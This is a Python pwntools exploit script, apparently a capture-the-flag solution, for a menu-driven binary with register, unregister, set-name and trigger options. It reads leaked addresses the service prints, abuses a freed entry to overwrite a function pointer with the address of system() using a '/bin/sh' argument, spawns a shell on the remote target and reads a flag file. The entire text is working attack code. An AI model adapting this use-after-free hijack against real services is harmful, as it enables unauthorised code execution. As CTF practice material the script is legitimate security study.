from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]


def register(r, idx: int):
    r.recvuntil(b"choice: ")
    r.sendline(b"1")
    r.recvuntil(b"Index: ")
    r.sendline(str(idx).encode())


def unregister(r, idx: int):
    r.recvuntil(b"choice: ")
    r.sendline(b"2")
    r.recvuntil(b"Index: ")
    r.sendline(str(idx).encode())


def set_name(r, idx: int, length: int, name: bytes):
    r.recvuntil(b"choice: ")
    r.sendline(b"3")
    r.recvuntil(b"Index: ")
    r.sendline(str(idx).encode())
    r.recvuntil(b"Nmae Length: ")
    r.sendline(str(length).encode())
    r.recvuntil(b"Name: ")
    r.send(name)


def trigger(r, idx: int):
    r.recvuntil(b"choice: ")
    r.sendline(b"4")
    r.recvuntil(b"Index: ")
    r.sendline(str(idx).encode())


def main():
    r = remote("10.113.184.121", 10057)
    # r = process("./chal")

    r.recvuntil(b"gift1: ")
    sys_addr = int(r.recvline().strip(), 16)
    log.info(f"{sys_addr = :x}")
    r.recvuntil(b"gift2: ")
    base = int(r.recvline().strip(), 16)
    log.info(f"{base = :x}")

    register(r, 0)
    register(r, 1)
    set_name(r, 1, 0x10, b"/bin/sh\x00")

    unregister(r, 0)
    set_name(r, 1, 0x18, p64(0) + p64(base + 0x60) + p64(sys_addr))
    trigger(r, 0)
    r.recvline()
    r.sendline(b"cat /home/chal/flag.txt")
    print(r.recvline().decode().strip())
    r.close()


if __name__ == "__main__":
    main()
